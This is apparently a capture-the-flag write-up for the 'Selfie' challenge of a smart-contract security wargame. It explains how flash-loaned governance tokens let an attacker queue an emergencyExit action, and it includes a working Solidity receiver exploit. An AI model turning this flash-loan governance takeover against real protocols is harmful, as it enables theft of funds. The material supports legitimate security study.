# The number of token that you own represent you voting power.

There is two vulnerabilities in this challenge, one the that the voting power is directly proportional to the number of gov token that you own. And two, the `Selfie` pool offers `flash-loan` of gov tokens.

What you only have to do is create a flash-loan receiver contract(see `selfie/SelfieReceiver.sol` file)that borrow an amount of gov tokens enough to represent more than 51% of tokens in circulation to be able to queue an action on the governance mechanism and after that return the funds to the pool.

That action can be to call `SelfiePool.emergencyExit` function in favor of the recovery address.
```js
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
@>      bytes memory actionData = abi.encodeCall(SelfiePool.emergencyExit, (payable(recovery)));
        uint256 receiverBalance = IERC20(token).balanceOf(address(this));
        console.log('receiverBalance: ', receiverBalance);
        
        DamnValuableVotes(token).delegate(address(this));
        governance.queueAction(address(pool), 0, actionData);

        IERC20(token).approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }
```

Once the action is queued you can call the `governance.executeAction ` function and the governance contract will execute  the `SelfiePool.emergencyExit` function with the given params.